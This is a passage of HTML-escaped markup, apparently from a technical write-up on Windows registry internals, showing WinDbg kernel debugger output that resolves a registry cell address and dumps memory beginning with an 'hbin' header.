ormwWEjHLs-c2&quot;&gt;Table&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Offset&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;MapTable&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff82828fe6a000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;MapEntry&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff82828fe6a018&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;BinAddress&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff82828f096009,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;BlockOffset&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0000000000000000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;BlockAddress&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff82828f096000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;pcell:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff82828f096004&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;It is a kernel-mode&lt;/span&gt;&lt;span&gt;&amp;nbsp;address, as expected.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;We can dump its contents to verify that it indeed contains registry data:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff82828f096000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff8282`8f096000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;69&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;6e&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00-00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;hbin............&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff8282`8f096010&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00-00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;................&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff8282`8f096020&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;6b&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00-20&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;8...sk..&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff8282`8f096030&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;b0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00-01&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;98&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;................&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff8282`8f096040&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00-14&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;................&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff8282`8f096050&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;05&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00-3f&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0f&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;05&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;......$.?.......&lt;/span&gt;&lt;/p&gt;
